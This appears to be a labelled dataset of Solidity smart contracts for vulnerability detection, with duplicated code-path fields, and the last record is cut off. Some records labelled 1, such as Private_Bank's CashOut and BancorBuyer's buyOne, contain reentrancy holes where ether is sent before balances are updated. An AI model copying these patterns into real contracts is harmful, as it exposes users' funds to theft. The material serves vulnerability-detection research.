{"sol name": "35878.sol", "label": 0, "first path": "function Forwarder(address _creator, bytes32 _regName, address _owner) public RegBase(_creator, _regName, _owner) forwardTo = owner; function() public payable { Forwarded(msg.sender, forwardTo, msg.value); require(forwardTo.call.value(msg.value)(msg.data)); function createNew(bytes32 _regName, address _owner) public payable feePaid returns (address kAddr_) kAddr_ = address(new Forwarder(msg.sender, _regName, _owner)); Created(msg.sender, _regName, kAddr_); ", "second path": "function Forwarder(address _creator, bytes32 _regName, address _owner) public RegBase(_creator, _regName, _owner) forwardTo = owner; function() public payable { Forwarded(msg.sender, forwardTo, msg.value); require(forwardTo.call.value(msg.value)(msg.data)); function createNew(bytes32 _regName, address _owner) public payable feePaid returns (address kAddr_) kAddr_ = address(new Forwarder(msg.sender, _regName, _owner)); Created(msg.sender, _regName, kAddr_); ", "third path": "function Forwarder(address _creator, bytes32 _regName, address _owner) public RegBase(_creator, _regName, _owner) forwardTo = owner; function() public payable { Forwarded(msg.sender, forwardTo, msg.value); require(forwardTo.call.value(msg.value)(msg.data)); function createNew(bytes32 _regName, address _owner) public payable feePaid returns (address kAddr_) kAddr_ = address(new Forwarder(msg.sender, _regName, _owner)); Created(msg.sender, _regName, kAddr_); ", "long path": "pragma solidity ^0.4.13; contract RegBaseAbstract { bytes32 public regName; bytes32 public resource; address public owner; address public newOwner; event ChangeOwnerTo(address indexed _newOwner); event ChangedOwner(address indexed _oldOwner, address indexed _newOwner); event ReceivedOwnership(address indexed _kAddr); event ChangedResource(bytes32 indexed _resource); function destroy() public; function changeOwner(address _owner) public returns (bool); function acceptOwnership() public returns (bool); function changeResource(bytes32 _resource) public returns (bool); } contract RegBase is RegBaseAbstract { bytes32 constant public VERSION = \"RegBase v0.3.3\"; modifier onlyOwner() { require(msg.sender == owner); _; } function RegBase(address _creator, bytes32 _regName, address _owner) { require(_regName != 0x0); regName = _regName; owner = _owner != 0x0 ? _owner : _creator != 0x0 ? _creator : msg.sender; } function destroy() public onlyOwner { selfdestruct(msg.sender); } function changeOwner(address _owner) public onlyOwner returns (bool) { ChangeOwnerTo(_owner); newOwner = _owner; return true; } function acceptOwnership() public returns (bool) { require(msg.sender == newOwner); ChangedOwner(owner, msg.sender); owner = newOwner; delete newOwner; return true; } function changeResource(bytes32 _resource) public onlyOwner returns (bool) { resource = _resource; ChangedResource(_resource); return true; } } pragma solidity ^0.4.13; contract Factory is RegBase { uint public value; event Created(address indexed _creator, bytes32 indexed _regName, address indexed _addr); modifier feePaid() { require(msg.value == value || msg.sender == owner); _; } function Factory(address _creator, bytes32 _regName, address _owner) RegBase(_creator, _regName, _owner) { } function set(uint _fee) onlyOwner returns (bool) { value = _fee; return true; } function withdrawAll() public returns (bool) { owner.transfer(this.balance); return true; } function createNew(bytes32 _regName, address _owner) payable returns(address kAddr_); } pragma solidity ^0.4.13; contract Forwarder is RegBase { bytes32 constant public VERSION = \"Forwarder v0.3.0\"; address public forwardTo; event Forwarded( address indexed _from, address indexed _to, uint _value); function Forwarder(address _creator, bytes32 _regName, address _owner) public RegBase(_creator, _regName, _owner) { forwardTo = owner; } function() public payable { Forwarded(msg.sender, forwardTo, msg.value); require(forwardTo.call.value(msg.value)(msg.data)); } function changeForwardTo(address _forwardTo) public returns (bool) { require(msg.sender == owner || msg.sender == forwardTo); forwardTo = _forwardTo; return true; } } contract ForwarderFactory is Factory { bytes32 constant public regName = \"forwarder\"; bytes32 constant public VERSION = \"ForwarderFactory v0.3.0\"; function ForwarderFactory( address _creator, bytes32 _regName, address _owner) public Factory(_creator, regName, _owner) { } function createNew(bytes32 _regName, address _owner) public payable feePaid returns (address kAddr_) { kAddr_ = address(new Forwarder(msg.sender, _regName, _owner)); Created(msg.sender, _regName, kAddr_); } } "}
{"sol name": "6881.sol", "label": 1, "first path": "function buyOne(ERC20 token, address _exchange, uint256 _value, bytes _data) payable public { balances[msg.sender] = balances[msg.sender].add(msg.value); uint256 tokenBalance = token.balanceOf(this); require(_exchange.call.value(_value)(_data)); balances[msg.sender] = balances[msg.sender].sub(_value); tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance)); ", "second path": "function buyOne(ERC20 token, address _exchange, uint256 _value, bytes _data) payable public { balances[msg.sender] = balances[msg.sender].add(msg.value); uint256 tokenBalance = token.balanceOf(this); require(_exchange.call.value(_value)(_data)); balances[msg.sender] = balances[msg.sender].sub(_value); tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance)); ", "third path": "function buyOne(ERC20 token, address _exchange, uint256 _value, bytes _data) payable public { balances[msg.sender] = balances[msg.sender].add(msg.value); uint256 tokenBalance = token.balanceOf(this); require(_exchange.call.value(_value)(_data)); balances[msg.sender] = balances[msg.sender].sub(_value); tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance)); ", "long path": "pragma solidity ^0.4.24; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } } contract ERC20Basic { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); } contract ERC20 is ERC20Basic { function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval( address indexed owner, address indexed spender, uint256 value ); } contract IMultiToken { function changeableTokenCount() external view returns(uint16 count); function tokens(uint256 i) public view returns(ERC20); function weights(address t) public view returns(uint256); function totalSupply() public view returns(uint256); function mint(address _to, uint256 _amount) public; } contract BancorBuyer { using SafeMath for uint256; mapping(address => uint256) public balances; mapping(address => mapping(address => uint256)) public tokenBalances; function sumWeightOfMultiToken(IMultiToken mtkn) public view returns(uint256 sumWeight) { for (uint i = mtkn.changeableTokenCount(); i > 0; i--) { sumWeight += mtkn.weights(mtkn.tokens(i - 1)); } } function deposit(address _beneficiary, address[] _tokens, uint256[] _tokenValues) payable external { if (msg.value > 0) { balances[_beneficiary] = balances[_beneficiary].add(msg.value); } for (uint i = 0; i < _tokens.length; i++) { ERC20 token = ERC20(_tokens[i]); uint256 tokenValue = _tokenValues[i]; uint256 balance = token.balanceOf(this); token.transferFrom(msg.sender, this, tokenValue); require(token.balanceOf(this) == balance.add(tokenValue)); tokenBalances[_beneficiary][token] = tokenBalances[_beneficiary][token].add(tokenValue); } } function withdraw(address _to, uint256 _value, address[] _tokens, uint256[] _tokenValues) external { if (_value > 0) { _to.transfer(_value); balances[msg.sender] = balances[msg.sender].sub(_value); } for (uint i = 0; i < _tokens.length; i++) { ERC20 token = ERC20(_tokens[i]); uint256 tokenValue = _tokenValues[i]; uint256 tokenBalance = token.balanceOf(this); token.transfer(_to, tokenValue); require(token.balanceOf(this) == tokenBalance.sub(tokenValue)); tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].sub(tokenValue); } } function buyOne(ERC20 token, address _exchange, uint256 _value, bytes _data) payable public { balances[msg.sender] = balances[msg.sender].add(msg.value); uint256 tokenBalance = token.balanceOf(this); require(_exchange.call.value(_value)(_data)); balances[msg.sender] = balances[msg.sender].sub(_value); tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance)); } function buy1(address[] _tokens,  address[] _exchanges, uint256[] _values, bytes _data1) payable public { balances[msg.sender] = balances[msg.sender].add(msg.value); this.buyOne(ERC20(_tokens[0]), _exchanges[0], _values[0], _data1); } function buy2(address[] _tokens, address[] _exchanges, uint256[] _values, bytes _data1, bytes _data2) payable public { balances[msg.sender] = balances[msg.sender].add(msg.value); this.buyOne(ERC20(_tokens[0]), _exchanges[0], _values[0], _data1); this.buyOne(ERC20(_tokens[1]), _exchanges[1], _values[1], _data2); } function buy3(address[] _tokens, address[] _exchanges, uint256[] _values, bytes _data1, bytes _data2, bytes _data3) payable public { balances[msg.sender] = balances[msg.sender].add(msg.value); this.buyOne(ERC20(_tokens[0]), _exchanges[0], _values[0], _data1); this.buyOne(ERC20(_tokens[1]), _exchanges[1], _values[1], _data2); this.buyOne(ERC20(_tokens[2]), _exchanges[2], _values[2], _data3); } } "}
{"sol name": "PrivateBank.sol", "label": 1, "first path": "function CashOut(uint _am)  { if(_am<=balances[msg.sender]) { if(msg.sender.call.value(_am)()) { balances[msg.sender]-=_am; TransferLog.AddMessage(msg.sender,_am,\"CashOut\"); function() public payable{} contract Log struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "second path": "function CashOut(uint _am)  { if(_am<=balances[msg.sender]) { if(msg.sender.call.value(_am)()) { balances[msg.sender]-=_am; TransferLog.AddMessage(msg.sender,_am,\"CashOut\"); function() public payable{} contract Log struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "third path": "function CashOut(uint _am)  { if(_am<=balances[msg.sender]) { if(msg.sender.call.value(_am)()) { balances[msg.sender]-=_am; TransferLog.AddMessage(msg.sender,_am,\"CashOut\"); function() public payable{} contract Log struct Message address Sender; string  Data; uint Val; uint  Time; Message[] public History; Message LastMsg; ", "long path": "pragma solidity ^0.4.19; contract Private_Bank { mapping (address => uint) public balances; uint public MinDeposit = 1 ether; Log TransferLog; function Private_Bank(address _log)   { TransferLog = Log(_log); } function Deposit() public  payable  { if(msg.value >= MinDeposit) { balances[msg.sender]+=msg.value; TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\"); } } function CashOut(uint _am)  { if(_am<=balances[msg.sender]) { if(msg.sender.call.value(_am)()) { balances[msg.sender]-=_am; TransferLog.AddMessage(msg.sender,_am,\"CashOut\"); } } } function() public payable{} } contract Log { struct Message { address Sender; string  Data; uint Val; uint  Time; } Message[] public History; Message LastMsg; function AddMessage(address _adr,uint _val,string _data)  public { LastMsg.Sender = _adr; LastMsg.Time = now; LastMsg.Val = _val; LastMsg.Data = _data; History.push(LastMsg); } } "}
{"sol name": "1123.sol", "label": 0, "first path": "function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  { uint256 _p1 = _eth / 100; uint256 _com = _eth / 50; _com = _com.add(_p1); uint256 _p3d; if (!address(admin).call.value(_com)()) { _p3d = _com; _com = 0; uint256 _aff = _eth / 10; if (_affID != _pID && plyr_[_affID].name != '') { plyr_[_affID].aff = _aff.add(plyr_[_affID].aff); emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now); } else { _p3d = _aff; _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100)); if (_p3d > 0) { admin.transfer(_p3d); _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount); return(_eventData_); function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private { if (plyrRnds_[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){ uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth); uint256 _refund = _eth.sub(_availableLimit); plyr_[_pID].gen = plyr_[_pID].gen.add(_refund); _eth = _availableLimit; if (_eth > 1000000000) { uint256 _keys = (round_[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000) { updateTimer(_keys, _rID); if (round_[_rID].plyr != _pID) round_[_rID].plyr = _pID; if (round_[_rID].team != _team) round_[_rID].team = _team; _eventData_.compressedData = _eventData_.compressedData + 100; if (_eth >= 100000000000000000) { airDropTracker_++; if (airdrop() == true) { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys); plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth); round_[_rID].keys = _keys.add(round_[_rID].keys); round_[_rID].eth = _eth.add(round_[_rID].eth); rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]); _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_); endTx(_pID, _team, _eth, _keys, _eventData_); function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   { if (plyrRnds_[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) { uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth); uint256 _refund = _eth.sub(_availableLimit); plyr_[_pID].gen = plyr_[_pID].gen.add(_refund); _eth = _availableLimit; if (_eth > 1000000000) { uint256 _keys = (round_[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000){ updateTimer(_keys, _rID); if (round_[_rID].plyr != _pID) round_[_rID].plyr = _pID; if (round_[_rID].team != _team) round_[_rID].team = _team; _eventData_.compressedData = _eventData_.compressedData + 100; if (_eth >= 100000000000000000) { airDropTracker_++; if (airdrop() == true) { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys); plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth); round_[_rID].keys = _keys.add(round_[_rID].keys); round_[_rID].eth = _eth.add(round_[_rID].eth); rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]); _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_); endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_); ", "second path": "function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  { uint256 _p1 = _eth / 100; uint256 _com = _eth / 50; _com = _com.add(_p1); uint256 _p3d; if (!address(admin).call.value(_com)()) { _p3d = _com; _com = 0; uint256 _aff = _eth / 10; if (_affID != _pID && plyr_[_affID].name != '') { plyr_[_affID].aff = _aff.add(plyr_[_affID].aff); emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now); } else { _p3d = _aff; _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100)); if (_p3d > 0) { admin.transfer(_p3d); _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount); return(_eventData_); function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private { if (plyrRnds_[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){ uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth); uint256 _refund = _eth.sub(_availableLimit); plyr_[_pID].gen = plyr_[_pID].gen.add(_refund); _eth = _availableLimit; if (_eth > 1000000000) { uint256 _keys = (round_[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000) { updateTimer(_keys, _rID); if (round_[_rID].plyr != _pID) round_[_rID].plyr = _pID; if (round_[_rID].team != _team) round_[_rID].team = _team; _eventData_.compressedData = _eventData_.compressedData + 100; if (_eth >= 100000000000000000) { airDropTracker_++; if (airdrop() == true) { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys); plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth); round_[_rID].keys = _keys.add(round_[_rID].keys); round_[_rID].eth = _eth.add(round_[_rID].eth); rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]); _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_); endTx(_pID, _team, _eth, _keys, _eventData_); function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   { if (plyrRnds_[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) { uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth); uint256 _refund = _eth.sub(_availableLimit); plyr_[_pID].gen = plyr_[_pID].gen.add(_refund); _eth = _availableLimit; if (_eth > 1000000000) { uint256 _keys = (round_[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000){ updateTimer(_keys, _rID); if (round_[_rID].plyr != _pID) round_[_rID].plyr = _pID; if (round_[_rID].team != _team) round_[_rID].team = _team; _eventData_.compressedData = _eventData_.compressedData + 100; if (_eth >= 100000000000000000) { airDropTracker_++; if (airdrop() == true) { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys); plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth); round_[_rID].keys = _keys.add(round_[_rID].keys); round_[_rID].eth = _eth.add(round_[_rID].eth); rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]); _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_); endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_); ", "third path": "function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  { uint256 _p1 = _eth / 100; uint256 _com = _eth / 50; _com = _com.add(_p1); uint256 _p3d; if (!address(admin).call.value(_com)()) { _p3d = _com; _com = 0; uint256 _aff = _eth / 10; if (_affID != _pID && plyr_[_affID].name != '') { plyr_[_affID].aff = _aff.add(plyr_[_affID].aff); emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now); } else { _p3d = _aff; _p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100)); if (_p3d > 0) { admin.transfer(_p3d); _eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount); return(_eventData_); function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private { if (plyrRnds_[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){ uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth); uint256 _refund = _eth.sub(_availableLimit); plyr_[_pID].gen = plyr_[_pID].gen.add(_refund); _eth = _availableLimit; if (_eth > 1000000000) { uint256 _keys = (round_[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000) { updateTimer(_keys, _rID); if (round_[_rID].plyr != _pID) round_[_rID].plyr = _pID; if (round_[_rID].team != _team) round_[_rID].team = _team; _eventData_.compressedData = _eventData_.compressedData + 100; if (_eth >= 100000000000000000) { airDropTracker_++; if (airdrop() == true) { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys); plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth); round_[_rID].keys = _keys.add(round_[_rID].keys); round_[_rID].eth = _eth.add(round_[_rID].eth); rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]); _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_); endTx(_pID, _team, _eth, _keys, _eventData_); function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   { if (plyrRnds_[_pID][_rID].keys == 0) _eventData_ = managePlayer(_pID, _eventData_); if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) { uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth); uint256 _refund = _eth.sub(_availableLimit); plyr_[_pID].gen = plyr_[_pID].gen.add(_refund); _eth = _availableLimit; if (_eth > 1000000000) { uint256 _keys = (round_[_rID].eth).keysRec(_eth); if (_keys >= 1000000000000000000){ updateTimer(_keys, _rID); if (round_[_rID].plyr != _pID) round_[_rID].plyr = _pID; if (round_[_rID].team != _team) round_[_rID].team = _team; _eventData_.compressedData = _eventData_.compressedData + 100; if (_eth >= 100000000000000000) { airDropTracker_++; if (airdrop() == true) { uint256 _prize; if (_eth >= 10000000000000000000) { _prize = ((airDropPot_).mul(75)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) { _prize = ((airDropPot_).mul(50)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 200000000000000000000000000000000; } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) { _prize = ((airDropPot_).mul(25)) / 100; plyr_[_pID].win = (plyr_[_pID].win).add(_prize); airDropPot_ = (airDropPot_).sub(_prize); _eventData_.compressedData += 300000000000000000000000000000000; _eventData_.compressedData += 10000000000000000000000000000000; _eventData_.compressedData += _prize * 1000000000000000000000000000000000; airDropTracker_ = 0; _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000); plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys); plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth); round_[_rID].keys = _keys.add(round_[_rID].keys); round_[_rID].eth = _eth.add(round_[_rID].eth); rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]); _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_); _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_); endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_); ", "long path": "pragma solidity ^0.4.24; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; require(c / a == b, \"SafeMath mul failed\"); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { require(b <= a, \"SafeMath sub failed\"); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; require(c >= a, \"SafeMath add failed\"); return c; } function sqrt(uint256 x) internal pure returns (uint256 y) { uint256 z = ((add(x,1)) / 2); y = x; while (z < y) { y = z; z = ((add((x / z),z)) / 2); } } function sq(uint256 x) internal pure returns (uint256) { return (mul(x,x)); } function pwr(uint256 x, uint256 y) internal pure returns (uint256) { if (x==0) return (0); else if (y==0) return (1); else { uint256 z = x; for (uint256 i=1; i < y; i++) z = mul(z,x); return (z); } } } library NameFilter { function nameFilter(string _input) internal pure returns(bytes32) { bytes memory _temp = bytes(_input); uint256 _length = _temp.length; require (_length <= 32 && _length > 0, \"string must be between 1 and 32 characters\"); require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, \"string cannot start or end with space\"); if (_temp[0] == 0x30) { require(_temp[1] != 0x78, \"string cannot start with 0x\"); require(_temp[1] != 0x58, \"string cannot start with 0X\"); } bool _hasNonNumber; for (uint256 i = 0; i < _length; i++) { if (_temp[i] > 0x40 && _temp[i] < 0x5b) { _temp[i] = byte(uint(_temp[i]) + 32); if (_hasNonNumber == false) _hasNonNumber = true; } else { require ( _temp[i] == 0x20 || (_temp[i] > 0x60 && _temp[i] < 0x7b) || (_temp[i] > 0x2f && _temp[i] < 0x3a), \"string contains invalid characters\" ); if (_temp[i] == 0x20) require( _temp[i+1] != 0x20, \"string cannot contain consecutive spaces\"); if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39)) _hasNonNumber = true; } } require(_hasNonNumber == true, \"string cannot be only numbers\"); bytes32 _ret; assembly { _ret := mload(add(_temp, 32)) } return (_ret); } } library F3Ddatasets { struct EventReturns { uint256 compressedData; uint256 compressedIDs; address winnerAddr; bytes32 winnerName; uint256 amountWon; uint256 newPot; uint256 P3DAmount; uint256 